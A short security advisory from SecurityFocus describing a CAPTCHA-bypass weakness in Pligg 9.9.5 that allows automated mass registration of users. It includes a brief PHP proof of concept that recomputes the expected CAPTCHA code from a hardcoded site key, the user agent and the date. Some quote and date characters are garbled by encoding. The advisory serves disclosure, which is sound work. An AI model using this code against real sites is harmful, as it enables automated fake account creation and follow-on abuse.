source: http://www.securityfocus.com/bid/30518/info

Pligg is prone to a security-bypass weakness.

Successfully exploiting this issue will allow an attacker to register multiple new users through an automated process. This may lead to other attacks.

Pligg 9.9.5 is vulnerable; other versions may also be affected.

<?php

$sitekey=82397834;

$ts_random=$_REQUEST[&#039;ts_random&#039;];

$datekey = date(?F j?);

$rcode = hexdec(md5($_SERVER[&#039;HTTP_USER_AGENT&#039;] . $sitekey . $ts_random . $datekey));

print substr($rcode, 2, 6);

?>